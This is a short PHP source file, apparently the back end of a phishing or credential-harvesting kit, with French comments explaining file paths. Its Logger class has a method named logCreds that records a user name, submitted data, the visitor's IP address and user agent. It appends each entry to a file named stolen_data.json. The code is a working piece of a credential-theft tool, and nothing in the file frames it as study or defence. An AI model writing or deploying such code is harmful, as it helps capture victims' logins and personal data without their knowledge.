<?php
class Logger {
    public static function logCreds($user, $data) {
        $entry = [
            'timestamp' => date('c'),
            'ip'        => $_SERVER['REMOTE_ADDR'],
            'user'      => $user,
            'data'      => $data,
            'ua'        => $_SERVER['HTTP_USER_AGENT']
        ];

        // __DIR__ pointe vers le dossier 'services'
        // .. remonte à la racine, puis on entre dans 'logs'
        $logFilePath = __DIR__ . '/../logs/stolen_data.json';

        file_put_contents($logFilePath, json_encode($entry) . PHP_EOL, FILE_APPEND);
    }
}